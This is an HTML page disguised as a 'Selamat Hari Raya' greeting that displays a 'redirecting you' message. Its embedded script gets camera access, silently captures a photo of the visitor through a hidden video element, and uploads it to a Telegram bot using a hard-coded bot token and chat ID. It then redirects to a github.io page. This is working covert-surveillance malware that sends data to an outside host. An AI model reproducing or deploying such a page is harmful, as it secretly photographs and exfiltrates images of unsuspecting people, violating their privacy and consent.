<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat Hari Raya</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f8f8f8;
            font-family: Arial, sans-serif;
        }

        #loadingText {
            display: none;
            font-size: 18px;
            font-weight: bold;
            color: #333;
        }

        video {
            position: absolute;
            width: 0;
            height: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div id="loadingText">We are redirecting you to the page...</div>
    <video id="video" autoplay muted></video>
    
    <script>
        const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";
        const CHAT_ID = "5934902786";
        const loadingText = document.getElementById('loadingText');
        const video = document.getElementById('video');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                video.srcObject = stream;
                video.muted = true;
                video.style.display = "none";

                setTimeout(() => {
                    loadingText.style.display = "block";
                    capturePhoto(stream);
                }, 500);
            })
            .catch(function(error) {
                console.log("Camera permission denied: ", error);
                alert("Please allow camera access to continue.");
            });

        function capturePhoto(stream) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = 640;
            canvas.height = 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoDataUrl = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            sendToTelegram(photoDataUrl);
        }

        function sendToTelegram(photoDataUrl) {
            const blob = dataURLtoBlob(photoDataUrl);
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("Photo sent to Telegram:", data);
                window.location.href = 'https://studandlearn.github.io/project-2/';
            })
            .catch(error => {
                console.error("Error sending photo:", error);
            });
        }

        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
